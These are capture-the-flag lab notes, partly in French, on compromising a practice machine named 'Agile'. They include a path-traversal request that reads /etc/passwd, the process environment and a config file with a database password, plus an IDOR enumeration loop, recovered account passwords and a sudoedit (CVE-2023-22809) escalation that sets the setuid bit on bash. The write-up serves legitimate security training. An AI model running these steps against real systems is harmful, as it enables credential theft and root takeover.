\chapter{Agile}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\subsection{nmap}
\begin{verbatim}
$ nmapz 10.10.11.203
TCP ports found: 22,80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 02:55 CET
Nmap scan report for 10.10.11.203
Host is up (0.030s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}


\section{http}
endpoint \verb+account/register+ qui renvoie une erreur

\begin{verbatim}
sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2006, "MySQL server has gone away (BrokenPipeError(32, 'Broken pipe'))")
[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
FROM users 
WHERE users.username = %(username_1)s 
 LIMIT %(param_1)s]
[parameters: {'username_1': 'test', 'param_1': 1}]
(Background on this error at: https://sqlalche.me/e/14/e3q8)
...

File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2528, in wsgi_app
File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 2525, in wsgi_app
File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1822, in full_dispatch_request
File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1820, in full_dispatch_request
File "/app/venv/lib/python3.10/site-packages/flask/app.py", line 1796, in dispatch_request
File "/app/app/superpass/infrastructure/view_modifiers.py", line 15, in view_method
File "/app/app/superpass/views/account_views.py", line 35, in register_post
File "/app/app/superpass/services/user_service.py", line 8, in create_user
File "/app/app/superpass/services/user_service.py", line 36, in get_user_by_name
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/query.py", line 2824, in first
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/query.py", line 2916, in _iter
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/orm/session.py", line 1714, in execute
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1705, in _execute_20
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/sql/elements.py", line 334, in _execute_on_connection
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1572, in _execute_clauseelement
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1943, in _execute_context
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 2124, in _handle_dbapi_exception
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/util/compat.py", line 211, in raise_
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/base.py", line 1900, in _execute_context
File "/app/venv/lib/python3.10/site-packages/sqlalchemy/engine/default.py", line 736, in do_execute
File "/app/venv/lib/python3.10/site-packages/pymysql/cursors.py", line 148, in execute
File "/app/venv/lib/python3.10/site-packages/pymysql/cursors.py", line 310, in _query
File "/app/venv/lib/python3.10/site-packages/pymysql/connections.py", line 548, in query
File "/app/venv/lib/python3.10/site-packages/pymysql/connections.py", line 775, in _read_query_result
File "/app/venv/lib/python3.10/site-packages/pymysql/connections.py", line 1156, in read
File "/app/venv/lib/python3.10/site-packages/pymysql/connections.py", line 701, in _read_packet

\end{verbatim}

donc mysql/python

\begin{verbatim}
app/venv/lib/python3.10/site-packages/pymysql/connections.py
/app/app/superpass/app.py"
\end{verbatim}


on a un path traversal sur \verb+/download?fn=../../etc/passwd+

\begin{verbatim}
[+] Date and Time: 03-29-2023 03:06:16

[========== TARGET INFORMATION ==========]
[+] Hostname: 10.10.11.203
[+] Setting Operating System type to "unix"
[+] Protocol: N/A
[+] Port: 80

[=========== TRAVERSAL ENGINE ===========]
[+] Traversal Engine DONE ! - Total traversal tests created: 1838

[+] Fuzz testing finished after 1.02 minutes (61 seconds)
[+] Total Traversals found: 1

[*] VULNERABLE PAYLOAD:
GET /download?fn=../../etc/passwd HTTP/1.1
Host: superpass.htb
Cookie: remember_token=11|b17090ab0a9b2a8487bb3850a9783eba8c24804f3188ae484528a8a1d30adcaf47f4781e7d81271f217e47ea448916bfb7ae6c1d523a9994112289054d5b9ac5; session=.eJwlzj0OwjAMQOG7ZGawHTtOepkq8Y9gbemEuDuV2N7whu9T9jzifJbtfVzxKPvLy1Z4zdqduvfF7M2d0EJHXUDorc6pmjl1iiwX4hRT4lANIx4LPNVgorh06uDYwjjQaUhw1FAERUuRCdkHElCr7e4cVe_BBpQbcp1x_DWI5fsDHW8vlw.ZCODrQ.vMacpzL-dKo22IEjeP2CQ85iWBI

$ curl -i  "http://superpass.htb/download?fn=../../etc/passwd" -H "Cookie: remember_token=11|b17090ab0a9b2a8487bb3850a9783eba8c24804f3188ae484528a8a1d30adcaf47f4781e7d81271f217e47ea448916bfb7ae6c1d523a9994112289054d5b9ac5; session=.eJwlzj0OwjAMQOG7ZGawHTtOepkq8Y9gbemEuDuV2N7whu9T9jzifJbtfVzxKPvLy1Z4zdqduvfF7M2d0EJHXUDorc6pmjl1iiwX4hRT4lANIx4LPNVgorh06uDYwjjQaUhw1FAERUuRCdkHElCr7e4cVe_BBpQbcp1x_DWI5fsDHW8vlw.ZCODrQ.vMacpzL-dKo22IEjeP2CQ85iWBI"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 29 Mar 2023 01:15:07 GMT
Content-Type: text/csv; charset=utf-8
Content-Length: 1744
Connection: keep-alive
Content-Disposition: attachment; filename=superpass_export.csv
Vary: Cookie
Set-Cookie: session=.eJwlzjEOwzAIQNG7eO4AGIydy0TYgFKpU6JOVe_eSN3-8If3KXuecR1lS3td8Sj708tWeFrtTt37ZPbmTrhCR51A6K2aqWaamsh0IU5ZShyqsYjHBE9dYCgunTo4tlgc6DQkOGooguJKEYPsAwmo1XZ3jqr3sAaUG_K-4vxrEMv3B0-aL-I.ZCORGw.xfBqyoth13dqN8SqexSwfjlA8Rk; HttpOnly; Path=/

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false

\end{verbatim}

\begin{verbatim}
 curl -I "http://superpass.htb/download?fn=../../app/app/superpass/app.py" ...

 $ curl -i  "http://superpass.htb/download?fn=../../proc/self/environ" 

LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/binHOME=/var/wwwLOGNAME=www-dataUSER=www-dataINVOCATION_ID=5cdcc9e8cd9d4ad795e51210f10f48afJOURNAL_STREAM=8:32300SYSTEMD_EXEC_PID=1069CONFIG_PATH=/app/config_prod.json

$ curl -i  "http://superpass.htb/download?fn=../../app/config_prod.json"
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}(
\end{verbatim}

donc visible on a un idor sur \verb+/vault/row/<id>+

\begin{verbatim}
for i in {1..10}; do echo $i ; curl -i  "http://superpass.htb/vault/row/$i" -H "Cookie: $COOKIE"; done

\end{verbatim}


\section{corum}
\begin{verbatim}
corum/5db7caa1d13cc37c9fc2
\end{verbatim}


\begin{verbatim}
edwards / d07867c6267dcb5df0af

\end{verbatim}

 CVE-2023-22809

 \begin{verbatim}
 export EDITOR='vim -- /app/venv/bin/activate'
sudo -u dev_admin sudoedit /app/config_test.json
# add chmod u+s /bin/bash
source /app/venv/bin/activate
 \end{verbatim}
 

